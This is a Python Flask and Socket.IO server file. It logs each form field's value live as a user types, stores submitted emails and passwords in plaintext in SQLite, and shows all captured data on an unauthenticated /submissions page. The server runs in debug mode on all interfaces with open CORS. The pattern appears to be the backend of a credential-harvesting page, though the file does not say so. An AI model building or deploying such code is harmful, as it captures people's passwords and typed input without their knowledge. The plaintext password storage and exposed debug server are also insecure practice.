from flask import Flask, render_template
from flask_socketio import SocketIO, emit
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os
app = Flask(__name__)

# -------------------- DATABASE CONFIG --------------------
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///formdata.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
db_path = os.path.join(BASE_DIR, "formdata.db")
app.config["SQLALCHEMY_DATABASE_URI"] = f"sqlite:///{db_path}"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

db = SQLAlchemy(app)

# Table for LIVE updates (optional)
class LiveUpdate(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    field = db.Column(db.String(50))
    value = db.Column(db.String(500))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

# Table for FINAL submitted form
class FinalSubmission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(200))
    password = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)


# -------------------- SOCKET.IO SETUP --------------------
socketio = SocketIO(app, cors_allowed_origins="*")

@app.route("/")
def index():
    return render_template("index.html")


# -------------------- LIVE UPDATES --------------------
@socketio.on("live_update")
def handle_live_update(data):
    field = data.get("field")
    value = data.get("value")

    print(f"[LIVE] {field}: {value}")

    # Save to database
    live = LiveUpdate(field=field, value=value)
    db.session.add(live)
    db.session.commit()


# -------------------- FINAL SUBMISSION --------------------
@socketio.on("submit_form")
def handle_submit(data):
    email = data.get("email")
    password = data.get("password")

    print(f"[FINAL] Email received")
    print(f"[FINAL] Password received")

    # Save to database
    final = FinalSubmission(email=email, password=password)
    db.session.add(final)
    db.session.commit()

    emit("form_saved", {"status": "ok"})


@app.route("/submissions")
def submissions():
    live_updates = LiveUpdate.query.order_by(LiveUpdate.timestamp.desc()).all()
    final_subs = FinalSubmission.query.order_by(FinalSubmission.timestamp.desc()).all()
    return render_template("submissions.html", live_updates=live_updates, final_subs=final_subs)


# -------------------- RUN SERVER --------------------
if __name__ == "__main__":
    with app.app_context():
        db.create_all()
        print("Database created at:", db_path)

    socketio.run(app, host="0.0.0.0", port=8000, debug=True, use_reloader=False)

